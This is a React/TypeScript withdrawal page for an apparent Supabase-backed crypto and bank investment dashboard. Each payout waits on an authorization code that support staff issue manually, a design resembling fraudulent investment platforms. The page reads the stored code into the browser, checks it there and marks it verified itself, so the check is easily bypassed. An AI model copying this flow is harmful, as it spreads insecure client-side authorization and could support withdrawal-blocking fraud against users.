import { useEffect, useState } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog";
import { toast } from "sonner";
import { Loader2, Bitcoin, Landmark, ShieldAlert, RefreshCw } from "lucide-react";
import { z } from "zod";
import { Link } from "react-router-dom";
import { useLiveData } from "@/hooks/useLiveData";
import { useCurrency } from "@/hooks/useCurrency";

const amountSchema = z.coerce.number().positive("Amount must be positive");
const codeSchema = z.string().trim().min(4, "Enter the authorization code");

export default function Withdraw() {
  const { user } = useAuth();
  const { format, currency } = useCurrency();
  const [submitting, setSubmitting] = useState(false);
  const { data: balanceData, refresh: refreshBalance } = useLiveData(async () => {
    if (!user) return { balance: 0 };
    const { data } = await supabase.from("profiles").select("balance").eq("user_id", user.id).maybeSingle();
    return { balance: data ? Number(data.balance) : 0 };
  }, [user?.id]);
  const balance = balanceData?.balance ?? 0;
  const [crypto, setCrypto] = useState({ coin: "BTC", amount: "", address: "" });
  const [bank, setBank] = useState({ amount: "", account_name: "", account_no: "", bank_name: "", swift: "" });

  // Auth-code dialog state
  const [authOpen, setAuthOpen] = useState(false);
  const [pendingTxId, setPendingTxId] = useState<string | null>(null);
  const [authCode, setAuthCode] = useState("");
  const [verifying, setVerifying] = useState(false);
  const [polling, setPolling] = useState(false);
  const [codeIssued, setCodeIssued] = useState(false);

  // Poll for code issuance from admin
  useEffect(() => {
    if (!authOpen || !pendingTxId || codeIssued) return;
    const i = setInterval(async () => {
      const { data } = await supabase.from("transactions").select("auth_code").eq("id", pendingTxId).maybeSingle();
      if (data?.auth_code) { setCodeIssued(true); setPolling(false); }
    }, 4000);
    return () => clearInterval(i);
  }, [authOpen, pendingTxId, codeIssued]);

  const submit = async (method: string, body: Record<string, unknown>, amt: string) => {
    if (!user) return;
    const a = amountSchema.safeParse(amt);
    if (!a.success) { toast.error(a.error.errors[0].message); return; }
    if (a.data > balance) { toast.error("Insufficient balance"); return; }
    setSubmitting(true);
    const { data, error } = await supabase.from("transactions").insert({
      user_id: user.id,
      type: "withdrawal",
      method,
      amount_usd: a.data,
      status: "pending",
      ...body,
    } as never).select("id").maybeSingle();
    setSubmitting(false);
    if (error || !data) { toast.error(error?.message ?? "Failed"); return; }
    setPendingTxId(data.id);
    setAuthCode("");
    setCodeIssued(false);
    setPolling(true);
    setAuthOpen(true);
  };

  const verify = async () => {
    if (!pendingTxId) return;
    const c = codeSchema.safeParse(authCode);
    if (!c.success) { toast.error(c.error.errors[0].message); return; }
    setVerifying(true);
    const { data } = await supabase.from("transactions").select("auth_code").eq("id", pendingTxId).maybeSingle();
    if (!data?.auth_code) {
      setVerifying(false);
      toast.error("Authorization code has not been issued yet. Please wait for the support team.");
      return;
    }
    if (data.auth_code.trim() !== c.data) {
      setVerifying(false);
      toast.error("Invalid authorization code.");
      return;
    }
    const { error } = await supabase.from("transactions").update({ auth_code_verified: true }).eq("id", pendingTxId);
    setVerifying(false);
    if (error) { toast.error(error.message); return; }
    toast.success("Code verified. Withdrawal request is now under final review.");
    setAuthOpen(false);
    setPendingTxId(null);
    refreshBalance();
  };

  const cancelRequest = async () => {
    if (pendingTxId) {
      await supabase.from("transactions").update({ status: "rejected" }).eq("id", pendingTxId);
    }
    setAuthOpen(false);
    setPendingTxId(null);
  };

  return (
    <div className="space-y-6">
      <div>
        <p className="label-mono text-muted-foreground mb-2">Cash out</p>
        <h1 className="font-display text-3xl font-light tracking-[-0.03em]">Withdraw</h1>
        <p className="text-muted-foreground text-[14px] mt-1">Available balance: <span className="text-foreground font-medium">{format(balance)}</span></p>
      </div>

      <div className="rounded-xl bg-yellow-500/10 border border-yellow-500/20 p-3 text-[12px] text-yellow-800 max-w-2xl">
        Withdrawals require a verified KYC and an authorization code from our compliance desk.{" "}
        <Link to="/dashboard/kyc" className="underline font-medium">Verify now</Link>.
      </div>

      <Tabs defaultValue="crypto">
        <TabsList className="grid w-full max-w-md grid-cols-2">
          <TabsTrigger value="crypto"><Bitcoin className="w-3.5 h-3.5 mr-1.5" /> Crypto</TabsTrigger>
          <TabsTrigger value="bank"><Landmark className="w-3.5 h-3.5 mr-1.5" /> Bank</TabsTrigger>
        </TabsList>

        <TabsContent value="crypto" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Coin</Label>
                <Select value={crypto.coin} onValueChange={(v) => setCrypto({ ...crypto, coin: v })}>
                  <SelectTrigger><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
                    <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
                    <SelectItem value="USDT">Tether (USDT)</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label>Amount (USD)</Label>
                <Input value={crypto.amount} onChange={(e) => setCrypto({ ...crypto, amount: e.target.value })} placeholder="100" />
                {crypto.amount && !isNaN(Number(crypto.amount)) && currency !== "USD" && (
                  <p className="text-[11px] text-muted-foreground mt-1">≈ {format(Number(crypto.amount))}</p>
                )}
              </div>
            </div>
            <div>
              <Label>Your wallet address</Label>
              <Input value={crypto.address} onChange={(e) => setCrypto({ ...crypto, address: e.target.value })} placeholder="Paste wallet address" className="font-mono text-xs" />
            </div>
            <Button
              disabled={submitting}
              onClick={() => submit(`Crypto ${crypto.coin}`, { wallet_address: crypto.address }, crypto.amount)}
              className="w-full"
            >
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>

        <TabsContent value="bank" className="mt-6">
          <div className="rounded-2xl border border-border bg-card p-6 max-w-2xl space-y-5">
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <Label>Amount (USD)</Label>
                <Input value={bank.amount} onChange={(e) => setBank({ ...bank, amount: e.target.value })} />
                {bank.amount && !isNaN(Number(bank.amount)) && currency !== "USD" && (
                  <p className="text-[11px] text-muted-foreground mt-1">≈ {format(Number(bank.amount))}</p>
                )}
              </div>
              <div>
                <Label>Bank name</Label>
                <Input value={bank.bank_name} onChange={(e) => setBank({ ...bank, bank_name: e.target.value })} />
              </div>
              <div>
                <Label>Account name</Label>
                <Input value={bank.account_name} onChange={(e) => setBank({ ...bank, account_name: e.target.value })} />
              </div>
              <div>
                <Label>Account number</Label>
                <Input value={bank.account_no} onChange={(e) => setBank({ ...bank, account_no: e.target.value })} />
              </div>
              <div className="sm:col-span-2">
                <Label>SWIFT / IBAN</Label>
                <Input value={bank.swift} onChange={(e) => setBank({ ...bank, swift: e.target.value })} />
              </div>
            </div>
            <Button
              disabled={submitting}
              onClick={() => submit("Bank transfer", { bank_details: bank }, bank.amount)}
              className="w-full"
            >
              {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : "Request withdrawal"}
            </Button>
          </div>
        </TabsContent>
      </Tabs>

      {/* Authorization code dialog */}
      <Dialog open={authOpen} onOpenChange={(o) => { if (!o) cancelRequest(); }}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <ShieldAlert className="w-5 h-5 text-yellow-600" /> Authorization required
            </DialogTitle>
            <DialogDescription>
              Your withdrawal request was submitted. For security, our compliance desk must issue an authorization code before funds can be released.
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-4">
            {!codeIssued ? (
              <div className="rounded-xl bg-muted/60 border border-border p-4 flex items-start gap-3">
                <RefreshCw className={`w-4 h-4 mt-0.5 ${polling ? "animate-spin" : ""} text-muted-foreground`} />
                <div className="text-[13px] text-muted-foreground">
                  Waiting for the support team to issue your code. You can leave this open or check back from your email/support chat.
                </div>
              </div>
            ) : (
              <div className="rounded-xl bg-emerald-500/10 border border-emerald-500/20 p-3 text-[13px] text-emerald-800">
                A code has been issued. Enter it below to complete your request.
              </div>
            )}

            <div>
              <Label>Authorization code</Label>
              <Input
                value={authCode}
                onChange={(e) => setAuthCode(e.target.value.toUpperCase())}
                placeholder="ENTER CODE"
                className="font-mono tracking-widest text-center text-lg"
                maxLength={12}
              />
            </div>
          </div>

          <DialogFooter>
            <Button variant="outline" onClick={cancelRequest}>Cancel request</Button>
            <Button disabled={verifying} onClick={verify}>
              {verifying ? <Loader2 className="w-4 h-4 animate-spin" /> : "Verify & continue"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}
